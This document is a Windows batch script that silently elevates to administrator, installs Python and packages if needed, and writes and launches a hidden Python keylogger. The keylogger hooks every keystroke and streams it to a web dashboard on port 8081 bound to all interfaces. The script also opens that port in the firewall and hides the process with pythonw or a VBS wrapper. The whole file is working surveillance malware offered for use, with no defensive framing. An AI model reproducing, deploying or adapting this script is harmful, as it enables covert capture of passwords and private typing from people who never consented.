@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

REM All operations run silently

set PYTHON_EXE=
set PYTHONW_EXE=
if exist "C:\Program Files\Python311\pythonw.exe" (
    set PYTHON_EXE=C:\Program Files\Python311\python.exe
    set PYTHONW_EXE=C:\Program Files\Python311\pythonw.exe
)
if exist "C:\Program Files\Python312\pythonw.exe" (
    set PYTHON_EXE=C:\Program Files\Python312\python.exe
    set PYTHONW_EXE=C:\Program Files\Python312\pythonw.exe
)
if exist "C:\Python311\pythonw.exe" (
    set PYTHON_EXE=C:\Python311\python.exe
    set PYTHONW_EXE=C:\Python311\pythonw.exe
)
if exist "C:\Python312\pythonw.exe" (
    set PYTHON_EXE=C:\Python312\python.exe
    set PYTHONW_EXE=C:\Python312\pythonw.exe
)

if "%PYTHON_EXE%"=="" (
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '%TEMP%\python-installer.exe' -UseBasicParsing; Start-Process -FilePath '%TEMP%\python-installer.exe' -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1','Include_pip=1' -Wait; Remove-Item '%TEMP%\python-installer.exe'" >nul 2>&1
    set PYTHON_EXE=C:\Program Files\Python311\python.exe
    set PYTHONW_EXE=C:\Program Files\Python311\pythonw.exe
    timeout /t 5 /nobreak >nul 2>&1
)

"%PYTHON_EXE%" -m pip install keyboard flask flask-socketio --quiet >nul 2>&1

REM Create keylogger script
(
echo from flask import Flask, render_template_string
echo from flask_socketio import SocketIO
echo import keyboard
echo.
echo app = Flask^(__name__^)
echo socketio = SocketIO^(app, cors_allowed_origins="*"^)
echo.
echo def on_key_event^(event^):
echo     socketio.emit^("keystroke", {"key": event.name, "type": event.event_type, "timestamp": str^(event.time^)}^)
echo.
echo keyboard.hook^(on_key_event^)
echo.
echo HTML_TEMPLATE = '''^^^<!DOCTYPE html^^^>
echo ^^^<html^^^>
echo ^^^<head^^^>
echo     ^^^<title^^^>Keyboard Monitor^^^</title^^^>
echo     ^^^<style^^^>
echo         body { font-family: "Courier New", monospace; background: #0d1117; color: #58a6ff; padding: 20px; margin: 0; }
echo         h1 { color: #00ff00; border-bottom: 2px solid #00ff00; padding-bottom: 10px; }
echo         #controls { margin: 20px 0; }
echo         button { background: #238636; color: white; border: none; padding: 10px 20px; cursor: pointer; margin-right: 10px; border-radius: 5px; }
echo         button:hover { background: #2ea043; }
echo         #log { border: 2px solid #30363d; padding: 15px; height: 500px; overflow-y: auto; background: #161b22; border-radius: 5px; }
echo         .entry { margin: 3px 0; padding: 5px; border-left: 3px solid #58a6ff; padding-left: 10px; }
echo         .timestamp { color: #8b949e; font-size: 0.9em; }
echo         .key { color: #00ff00; font-weight: bold; }
echo         #stats { margin: 10px 0; padding: 10px; background: #161b22; border-radius: 5px; }
echo     ^^^</style^^^>
echo ^^^</head^^^>
echo ^^^<body^^^>
echo     ^^^<h1^^^>Keyboard Monitor^^^</h1^^^>
echo     ^^^<div id="stats"^^^>
echo         ^^^<span^^^>Total Keys: ^^^<strong id="count"^^^>0^^^</strong^^^>^^^</span^^^> ^| 
echo         ^^^<span^^^>Status: ^^^<strong id="status" style="color: #00ff00;"^^^>Active^^^</strong^^^>^^^</span^^^>
echo     ^^^</div^^^>
echo     ^^^<div id="controls"^^^>
echo         ^^^<button onclick="clearLog^(^)"^^^>Clear Log^^^</button^^^>
echo         ^^^<button onclick="downloadLog^(^)"^^^>Download Log^^^</button^^^>
echo         ^^^<button onclick="togglePause^(^)"^^^>Pause/Resume^^^</button^^^>
echo     ^^^</div^^^>
echo     ^^^<div id="log"^^^>^^^</div^^^>
echo     ^^^<script src="https://cdn.socket.io/4.0.0/socket.io.min.js"^^^>^^^</script^^^>
echo     ^^^<script^^^>
echo         var socket = io^(^);
echo         var log = document.getElementById^("log"^);
echo         var keyCount = 0;
echo         var paused = false;
echo         var logData = [];
echo         socket.on^("keystroke", function^(data^) {
echo             if ^(paused^) return;
echo             keyCount++;
echo             document.getElementById^("count"^).textContent = keyCount;
echo             var entry = document.createElement^("div"^);
echo             entry.className = "entry";
echo             var timestamp = new Date^(parseFloat^(data.timestamp^) * 1000^).toLocaleTimeString^(^);
echo             var keyDisplay = data.key;
echo             if ^(data.key === "space"^) keyDisplay = "[SPACE]";
echo             else if ^(data.key === "enter"^) keyDisplay = "[ENTER]";
echo             else if ^(data.key === "backspace"^) keyDisplay = "[BACKSPACE]";
echo             else if ^(data.key === "tab"^) keyDisplay = "[TAB]";
echo             else if ^(data.key.indexOf^("shift"^) === 0^) keyDisplay = "[SHIFT]";
echo             else if ^(data.key.indexOf^("ctrl"^) === 0^) keyDisplay = "[CTRL]";
echo             else if ^(data.key.indexOf^("alt"^) === 0^) keyDisplay = "[ALT]";
echo             entry.innerHTML = '^^^<span class="timestamp"^^^>[' + timestamp + ']^^^</span^^^> ^^^<span class="key"^^^>' + keyDisplay + '^^^</span^^^>';
echo             logData.push^({timestamp: timestamp, key: keyDisplay}^);
echo             log.appendChild^(entry^);
echo             log.scrollTop = log.scrollHeight;
echo         }^);
echo         function clearLog^(^) {
echo             log.innerHTML = "";
echo             keyCount = 0;
echo             logData = [];
echo             document.getElementById^("count"^).textContent = "0";
echo         }
echo         function downloadLog^(^) {
echo             var text = "";
echo             for ^(var i = 0; i ^^^< logData.length; i++^) {
echo                 text += "[" + logData[i].timestamp + "] " + logData[i].key + "\n";
echo             }
echo             var blob = new Blob^([text], {type: "text/plain"}^);
echo             var url = URL.createObjectURL^(blob^);
echo             var a = document.createElement^("a"^);
echo             a.href = url;
echo             a.download = "keylog_" + Date.now^(^) + ".txt";
echo             a.click^(^);
echo         }
echo         function togglePause^(^) {
echo             paused = !paused;
echo             document.getElementById^("status"^).textContent = paused ? "Paused" : "Active";
echo             document.getElementById^("status"^).style.color = paused ? "#ff6b6b" : "#00ff00";
echo         }
echo     ^^^</script^^^>
echo ^^^</body^^^>
echo ^^^</html^^^>'''
echo.
echo @app.route^("/"^)
echo def index^(^):
echo     return render_template_string^(HTML_TEMPLATE^)
echo.
echo if __name__ == "__main__":
echo     socketio.run^(app, host="0.0.0.0", port=8081, debug=False, allow_unsafe_werkzeug=True^)
) > "%TEMP%\kl.py"

netsh advfirewall firewall add rule name="Keylogger" dir=in action=allow protocol=TCP localport=8081 >nul 2>&1

REM Start keylogger completely hidden using pythonw.exe or VBS wrapper
if not "%PYTHONW_EXE%"=="" (
    REM Use pythonw.exe - no console window
    start "" "%PYTHONW_EXE%" "%TEMP%\kl.py"
) else (
    REM Create VBS wrapper to hide window
    echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\run.vbs"
    echo objShell.Run "cmd /c ""%PYTHON_EXE%"" ""%TEMP%\kl.py""", 0, False >> "%TEMP%\run.vbs"
    cscript //nologo "%TEMP%\run.vbs"
    del "%TEMP%\run.vbs"
)

exit
